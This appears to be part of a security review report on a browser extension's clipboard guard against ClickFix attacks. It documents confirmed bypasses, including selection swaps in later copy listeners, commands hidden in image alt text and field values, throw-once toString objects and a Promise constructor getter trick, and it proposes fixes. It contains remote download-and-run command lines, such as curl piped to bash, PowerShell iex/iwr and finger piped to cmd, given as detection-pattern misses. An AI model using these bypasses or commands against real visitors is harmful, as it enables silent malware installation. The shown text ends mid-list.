Control in the same run: a direct writeText(CMD) is rejected with NotAllowedError. Code: clipboard.js:386-391 `const sel = selectionText(); const field = fieldSelection(); if (!allowed(sel, copyNative) || ...) preventDefault` runs only in the capture listener added at 398-401.
confirmed.suggested_fix: Check again after all page listeners have run. One option: in onCopy, add a one-time bubble-phase listener on window (or check in a task queued before the default action is not possible). A safer option: in onCopy, when the event is not cancelled by the page, call preventDefault, read the selection once at the end of dispatch (from a last listener added with a capture=false listener on window that the guard re-adds at the end of the list), check it, and write the checked text with the native setData on the event's clipboardData. Add a Chrome test for selection and setSelectionRange changes inside a page copy listener.

verdict.reason: Confirmed. I re-ran docs/review-2026-11-16/repros/guards-lens/t2.mjs in headless Chrome with the unpacked extension. Cases D, E and F all print COMMAND WRITTEN. onCopy (src/guards/clipboard.js:369-395) reads selectionText() and fieldSelection() once, in the first window capture listener. The execCommand wrapper (511-520) also checks only before the native call. A page copy listener that runs later (document capture, target or bubble phase) can call selectAllChildren, addRange or setSelectionRange. Chrome then serializes the new selection, no setData call happens, and no wrapper sees the change. This is a full bypass of the main ClickFix path: a click handler runs execCommand('copy') and the page needs nothing more from the visitor. The CHANGELOG says 'a copy handler cannot swap in a command', but that covers only the 1.5 s key-window text (lastCopy.sel), not a change to the live selection. The guard is defense in depth, because the visitor must still paste the command, so I rate it high, not critical.
verdict.why_it_may_be_intentional: The header comment and CHANGELOG 0.3.3 say the copy listener is added first so that 'the selection is the visitor's own'. The design assumes the selection the browser copies is the one checked at capture time. No comment covers a change made later in the same dispatch. I found no intent for this gap.
verdict.fix_notes: In onCopy (clipboard.js ~369), when flagOn() is true and the host is not a safe host, stop the browser from serializing a live selection. Call the native preventDefault, then write the text that was checked with the native setData (capture DataTransfer.prototype.setData at load, before the wrapper replaces it): text/plain = the checked selection text (or the field slice). Optionally also write text/html from a clone of the checked ranges, after a check with allowed(). Page listeners that run later can still call setData, and that path is checked by the wrapper. Do the same in the execCommand path, so that the copy event it triggers is handled by onCopy as described. This also fixes finding #1 (text/plain is then exactly the toString text that was checked). Add a Chrome (Playwright) test with three cases: (a) a document copy listener that calls selectAllChildren on a hidden command span after execCommand('copy'); (b) the same after a real Ctrl+C on harmless text; (c) a listener that calls textarea.setSelectionRange onto a command line. All three must leave no command on the clipboard. Add a regression test that a normal Ctrl+C of plain text still copies it.

confirmed.title: Clipboard guard checks Selection.toString(), but Chrome copies ,
confirmed.description: selectionText() uses Selection.prototype.toString. In Chrome, toString() leaves out image alt text and the values of text fields inside the selected range. The copy serializer puts them into text/plain. The guard checks only toString() (and the focused field, which is not focused here). So a range that holds a command in an alt attribute or in a field value passes the check in the execCommand wrapper (line 518-520) and in onCopy (line 386-388).
confirmed.failure_scenario: Page shows 'Your verification code: 4821' followed by a 1x1 . The visitor selects the line and presses Ctrl+C, or the page selects it and calls execCommand('copy') on a click. toString() gives 'x y' (no command), the guard allows it, and the clipboard holds 'x powershell -w hidden -nop -c "iex (iwr ...)" y'. Same result with and in the range.
confirmed.evidence: Repro: docs/review-2026-11-16/repros/guards-lens/t3.mjs and t4.mjs (Chrome 153 with the extension). Output: `g1 toString "x y" exec true` -> `G range copy g1 COMMAND WRITTEN (bypass): "x powershell -w hidden ..."` (img alt) `G range copy g3 COMMAND WRITTEN (bypass)` (textarea) `G range copy g4 COMMAND WRITTEN (bypass)` (input value) `Ctrl+C on visible line holding a 1px COMMAND ON CLIPBOARD` (t4.mjs). Controls: ::before content and SVG text are not copied / are caught.
confirmed.suggested_fix: Do not trust toString() as the copied text. In onCopy, call preventDefault and write the text yourself: build the text with the native copy-equivalent (for example, clone the range contents with Range.prototype.cloneContents captured at load, and add alt text and field values), check it, and set it with the native setData. At minimum, also scan alt attributes and textarea/input values of elements inside the selected ranges and check them with matchDangerous.

verdict.reason: Confirmed. t3.mjs: g1 (img alt), g3 (textarea in the range) and g4 (input value in the range) print COMMAND WRITTEN, and the log shows 'g1 toString "x y" exec true'. t4.mjs: a real Ctrl+C on a visible line that holds a 1px leaves the command on the clipboard. selectionText() (clipboard.js:256-264) uses Selection.prototype.toString. That function leaves out alt text and the values of form controls inside the range, but Chrome's text/plain copy serializer includes them. The page needs no special timing and nothing beyond markup. When the visitor selects a line, the command does not show (a 1x1 image).
verdict.why_it_may_be_intentional: The comments say the selection is read through native getters, so that a page cannot replace toString. They assume toString() is equal to the copied text. I found nothing that states or tests this assumption for alt text or field values.
verdict.fix_notes: Best fix: the same one as #0. In onCopy, call preventDefault and set text/plain to the checked toString() text with the native setData, so the text that was checked is the text that is copied. Alt text is then left out of copies on non-safe hosts, which is a small and acceptable change. Narrower option (if the browser serializer must stay): before allowed(), walk each range of the selection (capture Selection.prototype.getRangeAt/rangeCount and Range.prototype.cloneContents at load). Collect the alt of each img/area/input[type=image] and the value of each textarea/input in the cloned fragment, and check selection + those texts with matchDangerous. Use this in both onCopy and the execCommand wrapper. Add Chrome tests: a range over , and , copied by execCommand from a click and by real Ctrl+C, must not put the command on the clipboard.

confirmed.title: Clipboard guard: setData / items.add fail open when the value's toString throws once, and the native call then converts it again
confirmed.description: The setData and items.add wrappers set call[0] and call[1] with StringFn inside try. When StringFn throws, the catch block 'fails open' and the native method gets the ORIGINAL object (call[1] = args[1]). The native method converts it to a string again. An object whose toString throws on the first call and returns the command on the second call gets the command written with no check. This breaks the stated rule 'Values are turned into text once; the checked text is the one passed on'. writeText handles this correctly (it rejects on error, line 414-418).
confirmed.failure_scenario: In a copy handler: e.clipboardData.setData('text/plain', {n:0, toString(){ if (this.n++===0) throw 1; return CMD; }}); e.preventDefault(); after execCommand('copy') on a click. Result: the clipboard holds the PowerShell command. The same works with e.clipboardData.items.add(obj, 'text/plain').
confirmed.evidence:
Repro: docs/review-2026-11-16/repros/guards-lens/t8.mjs (Chrome 153 with the extension). Output:
`control: setData(CMD) in copy handler no command: "clean"`
`setData(throw-once object) in copy handler COMMAND ON CLIPBOARD`
`items.add(throw-once object) in copy handler COMMAND ON CLIPBOARD`
Code: lines 584-592 `try { call[0] = StringFn(args[0]); call[1] = StringFn(args[1]); ... } catch { // fail open } return apply(fn, self, call);` and the same at 612-620. execCommand (514-529) has the same pattern for args[0].
confirmed.suggested_fix: When the string conversion throws, re-throw the error (do not call the native method with the unconverted value), as the writeText wrapper does. Only the check itself (allowed) may fail open; the conversion must never be repeated by the native call. Add unit tests with a throw-once toString for setData, items.add and execCommand.

verdict.reason: Confirmed with t8.mjs: setData(throw-once object) and items.add(throw-once object) in a copy handler print COMMAND ON CLIPBOARD, while the control setData(CMD) is blocked. In the setData wrapper (clipboard.js:584-592) and the items.add wrapper (612-620), a throw from StringFn goes to the 'fail open' catch. Then apply(fn, self, call) runs with call[1]/call[0] still holding the original object, and the native method calls toString a second time. The execCommand wrapper (514-524) has the same flaw: if StringFn(args[0]) throws once, the selection check is skipped and the native call converts the object to 'copy'. This breaks the guard's own stated rule ('Values are turned into text once; the checked text is the one passed on'). The writeText wrapper (409-418) does this correctly.
verdict.why_it_may_be_intentional: The 'fail open' in these catch blocks is deliberate: the header says 'an error in the guard lets the original call through'. Its purpose is to keep pages working when the guard itself breaks. CHANGELOG 0.3.3 fixed the 'harmless text first, command second' variant, but not the 'throw first, command second' variant. A conversion error comes from page code, not from the guard, so failing open there has no valid reason.
verdict.fix_notes: In wrappedSet, wrappedAdd and wrappedExec, move the StringFn conversions out of the fail-open try. If the conversion throws, rethrow that error to the caller and never call the native method, as writeText does. Only the allowed() check may stay inside the try/catch that fails open, and it then calls the native method with the converted strings. Add unit tests in test/guards.test.js (fake DataTransfer/DataTransferItemList/Document). For each wrapper, use an object whose toString throws on the first call and returns CMD on the second. The wrapper must throw, and the fake native method must never be called (or never receive CMD).

confirmed.title: clipboard.write() check fails open when the page makes Promise.prototype.constructor throw for one call
confirmed.description: run() awaits the native getType() promise. `await` reads promise.constructor (PromiseResolve). A page can define a throwing getter on Promise.prototype.constructor right before it calls write() and remove it right after (the async function runs to its first await synchronously). The throw goes to `catch { verdict = true }`, and the native write runs with the command. The comment at line 53-55 lists 'a page that rewrites Promise internals' as a known UNVERIFIED limit; this is new evidence: it is proven in Chrome and needs only two lines, and it is a fail-open in the guard's own catch, not interference.
confirmed.failure_scenario: On a click: Object.defineProperty(Promise.prototype,'constructor',{get(){throw new Error()},configurable:true}); const p = navigator.clipboard.write([new ClipboardItem({'text/plain': new Blob([CMD])})]); Object.defineProperty(Promise.prototype,'constructor',{value:Promise,writable:true,configurable:true}). Result: write resolves and the clipboard holds the command. A variant that also replaces Promise.prototype.then can feed a harmless Blob to the check (t2.mjs case A2).
confirmed.evidence: Repro: docs/review-2026-11-16/repros/guards-lens/t7.mjs. Output: `console: write resolved` / `write() after Promise.prototype.constructor getter throws COMMAND ON CLIPBOARD`. Also t2.mjs: `A2 write() + Promise.prototype.constructor COMMAND WRITTEN (bypass)`. Code: line 479-480 `} catch { verdict = true; // not readable by us: the native call decides }`.
confirmed.suggested_fix: Fail closed on the write() path: in the catch, set verdict = false (reject with NotAllowedError) when the flag is on and the host is not a safe host. Do not use `await`; chain with the captured native Promise.prototype.then via Reflect.apply, so no page-visible lookup (constructor, then) is on the path.

verdict.reason: Confirmed with t7.mjs ('write resolved', COMMAND ON CLIPBOARD) and t2.mjs case A2. run() (clipboard.js:466-485) awaits getType()/text(). `await` on a native promise looks up promise.constructor. A getter on Promise.prototype.constructor that throws once lands in `catch { verdict = true }`, and the native write then runs with the command. The page needs only two synchronous lines around the write() call. The header comment (53-55) lists 'a page that rewrites Promise internals' as a known UNVERIFIED limit. The rules allow it here because this is new evidence: it is now proven in Chrome, it is trivial, and the cause is the guard's own fail-open catch, not a broken check. It needs a deliberate attack on this guard, so I rate it medium.
verdict.why_it_may_be_intentional: clipboard.js:53-55: 'Known limit (UNVERIFIED in practice): the clipboard.write() check awaits promises, and a page that rewrites Promise internals can still interfere with that one asynchronous path.' The catch comment says 'not readable by us: the native call decides'. The authors chose fail-open on purpose, but did not verify how easy it is to exploit.
verdict.fix_notes: In wrappedWrite's run(): (1) do not use `await` or async functions. Capture Promise.prototype.then at load and chain with apply(nativeThen, p, [onOk, onErr]). The engine still reads .constructor inside then's SpeciesConstructor, so a guard is needed: check that getOwnDesc(p, 'constructor') is absent and resolve the species safely, or simply treat any throw as a block. (2) Fail closed: in the catch, when flagOn() and the host is not a safe host, set verdict = false (reject with blocked()) instead of true. Items that have no text/plain or text/html types are never read, so image-only writes are not affected. Add a Chrome test: a page that defines a throwing Promise.prototype.constructor getter around write([ClipboardItem({'text/plain': Blob(CMD)})]) must get NotAllowedError and leave the clipboard unchanged. Update the comment at 53-55.

confirmed.title: Clipboard guard treats a page-made selection plus the visitor's Ctrl+C as a deliberate copy, and then also allows page writes for 1.5 s
confirmed.description: The keydown listener stores the selection that exists when Ctrl/Cmd+C goes down. The guard does not know who made that selection. A page can select a hidden, off-screen span (with a transparent ::selection) at load and ask the visitor to 'press Ctrl+C, then Win+R, Ctrl+V'. deliberateCopy() then returns true for the browser copy and, for KEY_WINDOW_MS (1500 ms), for any page writeText/write/setData of a substring of that selection.
confirmed.failure_scenario: Page runs getSelection().selectAllChildren(hiddenSpan) where hiddenSpan holds the PowerShell command at left:-9999px, and shows 'Press Ctrl+C to copy your code'. The visitor presses Ctrl+C. Result: the command is on the clipboard and no notice is shown. In the same test run, a page writeText(CMD) on a click less than 1.5 s later also succeeded.
confirmed.evidence: Repro: docs/review-2026-11-16/repros/guards-lens/t4.mjs. Output: `page pre-selects hidden span, user presses Ctrl+C COMMAND ON CLIPBOARD`. The follow-up write() cases in t4.mjs also succeeded inside the 1.5 s window, while the same cases in a clean page (t6.mjs) were rejected with NotAllowedError.
confirmed.suggested_fix: Count a selection as the visitor's own only when a trusted pointer or keyboard selection gesture (pointerdown/up with movement, shift+arrow, double click) changed it, tracked with selectionchange after trusted input. Also refuse when the selected range is not visible (off-screen, zero size, transparent). Keep the 1.5 s write window only for the exact text that the visitor selected with such a gesture.

verdict.reason: Confirmed with t4.mjs: 'page pre-selects hidden span, user presses Ctrl+C' gives COMMAND ON CLIPBOARD. After that, write() calls with CMD in the same page also succeed within the 1.5 s window, while t6.mjs (a clean page, no Ctrl+C) rejects the same write() calls with NotAllowedError. The keydown listener (clipboard.js:330-340) records selectionText() but does not record who made the selection. deliberateCopy() (169-180) then allows any substring of it for KEY_WINDOW_MS. The project already fixed the same attack for the right-click path (test/nightly-guards-6-any-right-click-authorises-30-s-of-write.test.js: 'The page can set that selection itself (selectAllChildren on a hidden node)'), but did not fix it for the key path. The attack needs the visitor to press Ctrl+C on request, which is a plausible ClickFix change once auto-copy is blocked. So I rate it medium.
verdict.why_it_may_be_intentional: The design treats 'the visitor pressed Ctrl+C' as consent, and README line 71 tells users to 'select the text and press Ctrl+C' to copy on purpose. The browser's own Ctrl+C of a selection must keep working. The guard cannot easily tell who made a selection, and nothing in CHANGELOG/TODO marks the hidden-selection plus Ctrl+C case as accepted.
verdict.fix_notes: Two parts. (a) Low risk: for kind 'key', allow page-initiated writes (writeText/write/setData with nativeCopy !== true) only for text that the visitor selected through a trusted gesture. Track a 'userSelected' flag: set it on trusted pointerup/dblclick/shift+arrow keydown, clear it on selectionchange that comes with no trusted input in the last ~500 ms. If the flag is false, do not allow page writes. (b) For the native copy in onCopy: when the selection is dangerous and no trusted selection gesture made it, or its ranges are not visible (getBoundingClientRect zero-size or off-viewport, through captured Range.prototype.getBoundingClientRect), block the copy and show the notice. Add Chrome tests: selectAllChildren on an off-screen command span followed by a real Ctrl+C must not copy it. A visitor who drag-selects a visible command and presses Ctrl+C must still copy it.

confirmed.title: Clipboard patterns miss common real ClickFix payloads (pipe to /bin/bash, nohup bash, bash <(curl), finger | cmd, WebDAV UNC paths)
confirmed.description: curl-pipe-shell needs the shell name right after the pipe: `\|\s*(?:sudo\s+)?(?:ba|z|da)?sh\b`. A full path (/bin/bash) or a prefix (nohup) is not matched. Process substitution is not covered. On Windows, the 'finger user@host | cmd' variant (used by ClickFix campaigns in 2025) and remote executables or MSI/SCT files on a WebDAV UNC path are not matched by any pattern (msiexec-remote and regsvr32 need http(s)).
confirmed.failure_scenario: A page writes `curl -fsSL https://203.0.113.5/a.sh | /bin/bash` with writeText on a click. matchDangerous returns null, so allowed() returns true and the command is written. The same for the other strings listed in evidence.
confirmed.evidence:

MISSED `curl -fsSL https://203.0.113.5/a.sh | /bin/bash`
MISSED `curl -fsSL https://203.0.113.5/a.sh | nohup bash`
MISSED `bash <(curl -fsSL https://203.0.113.5/a.sh)`

MISSED `cmd /c "finger vke@203.0.113.5 | cmd"`
